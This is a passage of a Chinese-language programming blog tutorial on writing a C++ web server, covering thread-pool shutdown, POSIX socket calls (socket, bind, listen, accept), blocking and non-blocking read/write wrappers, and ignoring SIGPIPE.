task_queue_.push(task);</span><br><span class="line">        <span class="comment">// 每当有新事件进入之时,只唤醒一个等待线程</span></span><br><span class="line">        threadpool_cond_.notify();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6-销毁线程池">6. 销毁线程池</h3>
<p>销毁线程池时，需要判断销毁的方式。</p>
<p>这里设置了两种销毁方式，分别是</p>
<ol>
<li>
<p>IMMEDIATE_SHUTDOWN</p>
</li>
<li>
<p>GRACEFUL_QUIT</p>
</li>
</ol>
<p>对于第一种销毁方式，线程池将马上清空事件队列中的全部事件，并添加与线程个数相对应量的<strong>退出事件</strong>。这将会使每个子线程在<strong>执行完当前事件后，马上执行退出事件</strong>以退出。</p>
<blockquote>
<p><strong>退出事件</strong>如下：每个线程简单执行 pthread_exit 以退出。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">auto</span> pthreadExit = [](<span class="keyword">void</span>*) &#123; pthread_exit(<span class="number">0</span>); &#125;;</span><br></pre></td></tr></table></figure>
<p>而对于第二种销毁方式来说，只是简单的添加退出事件，没有额外的清空之前的事件。这样线程池只会在<strong>所有事件全部结束</strong>后才真正的被销毁。</p>
<p>以下是具体的实现代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ThreadPool::~ThreadPool()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 向任务队列中添加退出线程事件,注意上锁</span></span><br><span class="line">    <span class="comment">// 注意在 cond 使用之前一定要上 mutex</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 操作 task_queue_ 时一定要上锁</span></span><br><span class="line">        <span class="function">MutexLockGuard <span class="title">guard</span><span class="params">(threadpool_mutex_)</span></span>;</span><br><span class="line">        <span class="comment">// 如果需要立即关闭当前的线程池,则</span></span><br><span class="line">        <span class="keyword">if</span>(shutdown_mode_ == IMMEDIATE_SHUTDOWN)</span><br><span class="line">            <span class="comment">// 先将当前队列清空</span></span><br><span class="line">            <span class="keyword">while</span>(!task_queue_.empty())</span><br><span class="line">                task_queue_.pop();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 往任务队列中添加退出线程任务</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; threadNum_; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">auto</span> pthreadExit = [](<span class="keyword">void</span>*) &#123; pthread_exit(<span class="number">0</span>); &#125;;</span><br><span class="line">            ThreadpoolTask task = &#123; pthreadExit, <span class="literal">nullptr</span> &#125;;</span><br><span class="line">            task_queue_.push(task);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 唤醒所有线程以执行退出操作</span></span><br><span class="line">        threadpool_cond_.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; threadNum_; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 回收线程资源</span></span><br><span class="line">        pthread_join(threads_[i], <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-参考链接">7. 参考链接</h3>
<ul>
<li>
<p><a href="https://github.com/linyacool/WebServer" target="_blank" rel="noopener">linyacool/WebServer - github</a></p>
</li>
<li>
<p><a href="https://blog.csdn.net/qq_36359022/article/details/78796784" target="_blank" rel="noopener">线程池原理及C语言实现线程池</a></p>
</li>
</ul>
<h2 id="三、网络连接">三、网络连接</h2>
<h3 id="1-概述-2">1. 概述</h3>
<p>执行一次完整的网络连接通常需要执行数个 <strong>socket 类</strong> 函数。</p>
<p>为了弄懂这些函数的使用，本人将在下面随着代码的编写，尽量讲解所使用到的函数内容。</p>
<p>注：以下部分主要参考自 <strong>Linux/Posix manual page</strong>（<code>man</code>指令真是一个好东西 XD）。</p>
<h3 id="2-socket">2. socket</h3>
<ul>
<li>
<p>socket 函数主要用于创建网络交互（communication）中的一个终端（endpoint），即创建一个 socket fd 文件描述符。</p>
</li>
<li>
<p>socket 函数的类型声明如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;          /* See NOTES */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行成功则返回一个新文件描述符fd，失败则返回-1并设置errno</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure>
<p>其中，对于参数 domain，我们主要用到以下两种类型:</p>
<ul>
<li>AF_UNIX / AF_LOCAL：本地通信，通常用于<strong>进程间通信</strong>。其通信不经过网卡，速度远远大于 AF_INET。</li>
<li>AF_INET： IPv4 协议通信，数据需要经过网卡。</li>
</ul>
<blockquote>
<p>IPv6 和 bluetooth 等类型暂且不表。比较诧异的是，AF_VSOCK用于虚拟机程序与宿主机进行通信。</p>
</blockquote>
<p>对于参数 type，常用的主要有以下几种：</p>
<ul>
<li>
<p>SOCK_STREAM： TCP 通信</p>
</li>
<li>
<p>SOCK_DGRAM： UDP 通信</p>
</li>
<li>
<p>SOCK_NONBLOCK： 设置非阻塞 socket。使用 or 运算符来附加属性</p>
<blockquote>
<p>与设置 O_NONBLOCK 至对应文件描述符操作<strong>等同</strong>。</p>
</blockquote>
</li>
<li>
<p>SOCK_CLOEXEC： 设置若当前程序执行 exec 时，对应文件描述符将在子进程中给关闭。使用 or 运算符来附加属性</p>
<blockquote>
<p>与设置 FD_CLOEXEC 至对应文件描述符等同。</p>
</blockquote>
</li>
</ul>
<p>参数 protocol 通常用于指定某一个特定的套接字协议。如果给定协议系列只有一个协议可以支持特定的套接字类型，则 protocol 可以指定为0。但是若给定协议系列中可能存在多个可以支持套接字的类型，这时候就必须设置 protocol 以指定具体类型。</p>
</li>
<li>
<p>简单举例：创建一个 IPv4 的 TCP 套接字（最常用）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> listen_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-bind">3. bind</h3>
<ul>
<li>
<p>对于一个<strong>新创建</strong>的 socket（注意是<strong>新创建</strong>的），还没有任何的地址用于赋给该 socket。而 bind 函数就是用于赋以一个地址给该 socket。</p>
<p>需要注意的是：如果当前 socket 在执行 bind 前已经被使用，则<strong>操作系统将会自动分配地址以及端口号</strong>等等，这也是为什么一些网络程序向外通信时使用的端口号是随机的，因为操作系统会在后面调控。</p>
</li>
<li>
<p>bind 函数的声明如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;          /* See NOTES */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行成功则返回0，失败则返回-1并设置errno</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>其中，<strong>第一个参数sockfd</strong> 用以传入目标 socket 文件描述符</p>
</li>
<li>
<p>至于<strong>第二个参数addr</strong>，其中使用的规则与结构体，在地址族之间有所不同。</p>
</li>
<li>
<p><strong>第三个参数addrlen</strong>用于表示<strong>第二个参数addr</strong>所指向结构体的size。</p>
</li>
</ul>
<p>对于 AF_INET：所使用到的 address format 如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt; // ! 注意头文件！！</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">    <span class="keyword">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中，sin_family 始终为 AF_INET；sin_port 设置为目标端口；sin_addr用以保存<strong>监听目标的地址</strong>。</p>
<p>这里多提一句，由于现代计算机可能有多张网卡，因此指定 sin_addr 可以使得只监听特定网卡的连接。如果想监听<strong>全部网卡的连接</strong>，则可以使用宏定义 <strong>INADDR_ANY</strong>（实际上就是 0.0.0.0）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Address to accept any incoming messages.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INADDR_ANY  ((in_addr_t) 0x00000000)</span></span><br></pre></td></tr></table></figure>
<p>而如果绑定 127.0.0.1 回环地址，则<strong>只能监听到主动发送至回环地址的请求</strong>，其他发送到当前该机器但目标IP非回环地址的请求则不会被处理。</p>
<blockquote>
<p>注意：sin_port、sin_addr 变量都必须以<strong>网络端序</strong>来保存数据（即大端序）。</p>
<p>socket提供了端序转换的一些函数，便于转换（其中，h表示host，n表示network）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Functions to convert between host and network byte order.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Please note that these functions normally take `unsigned long int' or</span></span><br><span class="line"><span class="comment">`unsigned short int' values as arguments and also return them.  But</span></span><br><span class="line"><span class="comment">this was a short-sighted decision since on different systems the types</span></span><br><span class="line"><span class="comment">may have different representations but the values are always the same.  */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">uint32_t</span> <span class="title">ntohl</span> <span class="params">(<span class="keyword">uint32_t</span> __netlong)</span> __THROW __<span class="title">attribute__</span> <span class="params">((__const__))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">uint16_t</span> <span class="title">ntohs</span> <span class="params">(<span class="keyword">uint16_t</span> __netshort)</span></span></span><br><span class="line"><span class="function">__THROW __<span class="title">attribute__</span> <span class="params">((__const__))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">uint32_t</span> <span class="title">htonl</span> <span class="params">(<span class="keyword">uint32_t</span> __hostlong)</span></span></span><br><span class="line"><span class="function">__THROW __<span class="title">attribute__</span> <span class="params">((__const__))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">uint16_t</span> <span class="title">htons</span> <span class="params">(<span class="keyword">uint16_t</span> __hostshort)</span></span></span><br><span class="line"><span class="function">__THROW __<span class="title">attribute__</span> <span class="params">((__const__))</span></span>;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<blockquote>
<p>如果需要<strong>网络端序IP地址&lt;—&gt;字符串</strong>类型转变，则请参照以下函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_aton</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp, struct in_addr *inp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">inet_addr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">inet_network</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">inet_ntoa</span><span class="params">(struct in_addr in)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">struct in_addr <span class="title">inet_makeaddr</span><span class="params">(<span class="keyword">in_addr_t</span> net, <span class="keyword">in_addr_t</span> host)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">inet_lnaof</span><span class="params">(struct in_addr in)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">inet_netof</span><span class="params">(struct in_addr in)</span></span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>对于一个 AF_NET 地址族来说，执行 bind 的一个简单例子如下：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 绑定端口</span></span><br><span class="line">sockaddr_in server_addr;</span><br><span class="line"><span class="comment">// 初始化一下</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;server_addr, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line"><span class="comment">// 设置一下基本操作</span></span><br><span class="line">server_addr.sin_family = AF_INET;</span><br><span class="line">server_addr.sin_port = htonl((<span class="keyword">unsigned</span> short)port);</span><br><span class="line">server_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 试着bind</span></span><br><span class="line"><span class="keyword">if</span>(bind(listen_fd, (sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>
<h3 id="4-listen">4. listen</h3>
<p>listen 函数将会使得传入的 socket fd 变为<strong>等待连接状态</strong>。该函数原型如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;          /* See NOTES */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 成功则返回0，失败则返回-1并设置 errno</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br></pre></td></tr></table></figure>
<p>该函数主要有两个参数：参数 sockfd 传入目标 fd；backlog 指定最大<strong>挂起连接</strong>的等待队列长度，如果队列满了，则新连接将会被拒绝（ECONNREFUSED）。而对于某些特殊协议，将会在一段时间后重新发起连接。</p>
<h3 id="5-accept">5. accept</h3>
<ul>
<li>
<p>accept 函数将会取出 <strong>listen_fd的挂起连接等待队列</strong> 中的第一个连接，创建一个新的 socket fd（client fd），并将其返回。后续与该连接的交互都是通过该client fd 完成。</p>
</li>
<li>
<p>需要注意的是， accept 会从 listen_fd 中取出挂起的连接，并尝试连接。一旦完成连接后，将会创建一个新的 client_fd。<strong>原先的 listen_fd 不会有任何改变</strong>。</p>
</li>
<li>
<p>如果当前 listen_fd 为<strong>阻塞式</strong>的，则如果当前挂起连接等待队列中不存在任何连接，那么<strong>执行 accept 时将阻塞</strong>，直到有新连接的到来。</p>
</li>
<li>
<p>该函数的原型如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;          /* See NOTES */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数为传入的监听socket listen_fd</li>
<li>第二个参数为指向 sockaddr 结构体的 一个指针，accept 函数将会把 <strong>远程 socket 的address</strong>写入目标结构体中</li>
<li>第三个参数是一个<strong>存放 sockaddr 结构体大小</strong>的指针。</li>
</ul>
</li>
</ul>
<h3 id="6-read-recv-write-send">6. read/recv &amp; write/send</h3>
<p>由于 read/recv &amp; write/send 操作涉及到<strong>阻塞与非阻塞式读写</strong>，因此我们需要额外对其做一些异常处理。</p>
<blockquote>
<p>需要注意的是，socket读写中，除了使用read/write以外，还可以使用专用于套接字通信的send/recv函数族等等。</p>
</blockquote>
<h4 id="a-错误码">a. 错误码</h4>
<p>该类函数中<strong>最常返回的错误</strong>为 <strong>EINTR</strong> 以及 <strong>EAGAIN</strong>，其他错误暂时忽略。其中：</p>
<ul>
<li>
<p><strong>EINTR</strong>：该错误常见于<strong>阻塞式</strong>的操作，提示当前操作被<strong>中断</strong>。</p>
<p>如果一个进程在一个慢系统调用中阻塞时，捕获到信号并执行完信号处理例程返回时，这个系统调用将<strong>不再被阻塞，而是被中断</strong>，返回 EINTR。</p>
<p>对于读写函数来说，当返回这类错误时，最常用的做法就是<strong>重新执行</strong>目标函数。</p>
</li>
<li>
<p><strong>EAGAIN</strong>：该错误常见于<strong>非阻塞式</strong>的操作，提示用户稍后再<strong>重新执行</strong>。</p>
<p>例如：</p>
<ul>
<li>当以<strong>非阻塞</strong>方式大量发送数据时，如果缓冲区爆满，则产生 Resource temporarily unavailable的错误（资源暂时不可用），并返回 EAGAIN。</li>
<li>当以<strong>非阻塞</strong>模式下读取数据，如果多次读取数据但没有数据可读，则此时不会阻塞等待数据，而是直接返回 EAGAIN</li>
</ul>
<p>对于 read 函数来说，由于数据取决于<strong>远程</strong>，因此当接收到 EAGAIN 时终止读取，直接返回；</p>
<p>但对于 write 函数来说，由于数据取决于<strong>当前服务器</strong>，因此可以继续循环写入，直至数据完全写入。</p>
</li>
</ul>
<p>对于 recv/send 函数来说，与 read/write 相比，将会额外多出部分专用于 socket 的错误码，例如 ECONNREFUSED、EPIPE 以及 ECONNRESET 等等。出于调试目的，在实现 读写函数的 wrapper时，将这两类读写函数全部集成在 wrapper中，并用一个bool参数来控制启用 read/write 还是 recv/send 函数。</p>
<h4 id="b-阻塞-非阻塞-读取">b. 阻塞/非阻塞 读取</h4>
<p>对于读取操作来说，阻塞读取和非阻塞读取又有所不同：</p>
<ul>
<li>当有数据到来时，阻塞和非阻塞的实现相同，都是读取数据并<strong>立即返回</strong>。</li>
<li>但是当没有数据到来时，由于非阻塞读取时会返回 EAGAIN 错误，因此可以<strong>立即返回</strong>；而阻塞读取此时就必须阻塞，直到数据到来才返回。</li>
</ul>
<p>在具体实现 读取操作的wrapper函数时，同样使用一个bool参数来控制是否是阻塞/非阻塞读取。</p>
<h4 id="c-返回值">c. 返回值</h4>
<p>read/recv &amp; write/send 函数的返回值</p>
<ul>
<li>若为负数则说明存在错误</li>
<li>若为0则说明<strong>连接中断</strong></li>
<li>若为正数则该数为成功读取/发送的字节数</li>
</ul>
<h4 id="d-最终实现的代码">d. 最终实现的代码</h4>
<p>综上所述，read/recv 函数重新实现的 wrapper 如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">readn</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span>*buf, <span class="keyword">size_t</span> len, <span class="keyword">bool</span> isBlock, <span class="keyword">bool</span> isRead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这里将 void* 转换成 char* 是为了在下面进行自增操作</span></span><br><span class="line">    <span class="keyword">char</span> *pos = (<span class="keyword">char</span>*)buf;</span><br><span class="line">    <span class="keyword">size_t</span> leftNum = len;</span><br><span class="line">    <span class="keyword">ssize_t</span> readNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(leftNum &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">ssize_t</span> tmpRead = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 尝试循环读取,如果报错,则进行判断</span></span><br><span class="line">        <span class="comment">// 注意, read 的返回值为0则表示读取到 EOF,是正常现象</span></span><br><span class="line">        <span class="keyword">if</span>(isRead)</span><br><span class="line">            tmpRead = read(fd, pos, leftNum);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tmpRead = recv(fd, pos, leftNum, (isBlock ? <span class="number">0</span> : MSG_DONTWAIT));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(tmpRead &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(errno == EINTR)</span><br><span class="line">                tmpRead = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 如果始终读取不到数据,则提前返回,因为这个取决于远程 fd,无法预测要等多久</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (errno == EAGAIN)</span><br><span class="line">                <span class="keyword">return</span> readNum;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 读取的0,则说明远程连接已被关闭</span></span><br><span class="line">        <span class="keyword">if</span>(tmpRead == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        readNum += tmpRead;</span><br><span class="line">        pos += tmpRead;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是阻塞模式下,并且读取到的数据较小,则说明数据已经全部读取完成,直接返回</span></span><br><span class="line">        <span class="keyword">if</span>(isBlock &amp;&amp; <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(tmpRead) &lt; leftNum)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        leftNum -= tmpRead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> readNum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>write/send 函数的 wrapper 同理：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">writen</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span>*buf, <span class="keyword">size_t</span> len, <span class="keyword">bool</span> isWrite)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这里将 void* 转换成 char* 是为了在下面进行自增操作</span></span><br><span class="line">    <span class="keyword">char</span> *pos = (<span class="keyword">char</span>*)buf;</span><br><span class="line">    <span class="keyword">size_t</span> leftNum = len;</span><br><span class="line">    <span class="keyword">ssize_t</span> writtenNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(leftNum &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">ssize_t</span> tmpWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(isWrite)</span><br><span class="line">            tmpWrite = write(fd, pos, leftNum);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tmpWrite = send(fd, pos, leftNum, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试循环写入,如果报错,则进行判断</span></span><br><span class="line">        <span class="keyword">if</span>(tmpWrite &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 与read不同的是,如果 EAGAIN,则继续重复写入,因为写入操作是有Server这边决定的</span></span><br><span class="line">            <span class="keyword">if</span>(errno == EINTR || errno == EAGAIN)</span><br><span class="line">                tmpWrite = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tmpWrite == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        writtenNum += tmpWrite;</span><br><span class="line">        pos += tmpWrite;</span><br><span class="line">        leftNum -= tmpWrite;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> writtenNum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-建立连接">7. 建立连接</h3>
<p>综上各类函数的分析，现在我们可以为服务器端开启一个<strong>监听套接字</strong>，并等待客户端连接：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_bind_and_listen</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listen_fd = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 开始创建 socket, 注意这是阻塞模式的socket</span></span><br><span class="line">    <span class="comment">// AF_INET      : IPv4 Internet protocols  </span></span><br><span class="line">    <span class="comment">// SOCK_STREAM  : TCP socket</span></span><br><span class="line">    <span class="keyword">if</span>((listen_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定端口</span></span><br><span class="line">    sockaddr_in server_addr;</span><br><span class="line">    <span class="comment">// 初始化一下</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;server_addr, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">    <span class="comment">// 设置一下基本操作</span></span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    server_addr.sin_port = htons((<span class="keyword">unsigned</span> short)port);</span><br><span class="line">    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">    <span class="comment">// 端口复用</span></span><br><span class="line">    <span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span class="keyword">sizeof</span>(opt)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 试着bind</span></span><br><span class="line">    <span class="keyword">if</span>(bind(listen_fd, (sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 试着listen, 设置最大队列长度为 1024</span></span><br><span class="line">    <span class="keyword">if</span>(listen(listen_fd, <span class="number">1024</span>) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> listen_fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到这部分代码，设置<strong>端口复用</strong>属性：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 端口复用</span></span><br><span class="line"><span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span class="keyword">sizeof</span>(opt)) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>
<p>正常来说，对于某个网络程序，一个端口只能绑定一个套接字，别的套接字无法使用这个端口。而如果需要让同一程序的不同套接字绑定统一端口，则需要设置<strong>端口复用</strong>属性。</p>
<blockquote>
<p>不过在当前WebServer-1.0版本中，设置端口复用貌似是不必要的，就算删除也无伤大雅。</p>
</blockquote>
<h3 id="8-忽略-SIGPIPE-信号">8. 忽略 SIGPIPE 信号</h3>
<p><strong>SIGPIPE 信号</strong>将在远程连接被中断时发出。默认的处理例程是<strong>终止程序</strong>，而这很明显不是我们所期望的处理方式。因此我们必须设置 WebServer 忽视 SIGPIPE 信号，以免被意外终止。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handleSigpipe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sa_handler = SIG_IGN;</span><br><span class="line">    sa.sa_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(sigaction(SIGPIPE, &amp;sa, <span class="literal">NULL</span>) == <span class="number">-1</span>)</span><br><span class="line">        LOG(ERROR) &lt;&lt; <span class="string">"Ignore SIGPIPE failed! "</span> &lt;&lt; strerror(errno) &lt;&lt; <span class="built_in">std</span>::<span 